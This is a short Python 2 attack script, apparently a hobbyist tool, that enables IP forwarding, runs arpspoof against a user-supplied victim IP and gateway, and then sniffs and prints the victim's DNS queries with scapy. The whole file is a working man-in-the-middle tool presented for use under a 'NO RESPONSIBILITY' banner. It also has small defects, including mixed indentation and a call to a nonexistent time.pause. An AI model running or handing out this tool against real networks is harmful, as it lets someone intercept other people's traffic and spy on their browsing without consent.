import time
from subprocess import *
from scapy.all import *
import sys
import os
try:
	os.system("clear")
	print("""
	   -----------------------------------------------------------
	   =                      Respect Coderz            	     =
	   =                      NO RESPONSIBILITY-                 =
	   =Reach The Coder ==> https://facebook.com/antoine.zayat.31=
	   =                  USE IT WISELY AND CARFULLY             =
	   =----------------------------------------------------------

""")
	choice = raw_input("[*] Is Port Forwarding Enabled(y/n): ")

	if(choice == "n"):
		print("")
		print("[*] Enabling Port Forwarding...")
		time.sleep(4)
               	pf = os.system("sysctl -w net.ipv4.ip_forward=1")
		os.system("clear")
		print("[*] Port Forwarding Has Been Enabled Successfully")
		print("")
	if(choice == "y"):
		pass
		os.system("clear")
		print("")

	interface = raw_input("[*] Enter Desired Interface: ")
	print("")
	victimip = raw_input("[*] Victim Ip: ")
	print("")
	gatewayip = raw_input("[*] Router Gateway Ip: ")
	print("")
	os.system("gnome-terminal -x arpspoof -i %(i)s -t %(v)s %(g)s" % {'i': interface, 'v': victimip, 'g': gatewayip})
	os.system("clear")
	print("")
	print("[*] Listening For DNS Queries From " + victimip)
except KeyboardInterrupt:
	print ("[*] User Requested Shutdown...")
	time.pause(4)
	print ("[*] Exiting...")
	sys.exit(1)

def querysniff(pkt):
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"

sniff(iface = interface,filter = "port 53", prn = querysniff, store = 0)
print ("[*] Shutting Down....")
time.sleep(4)
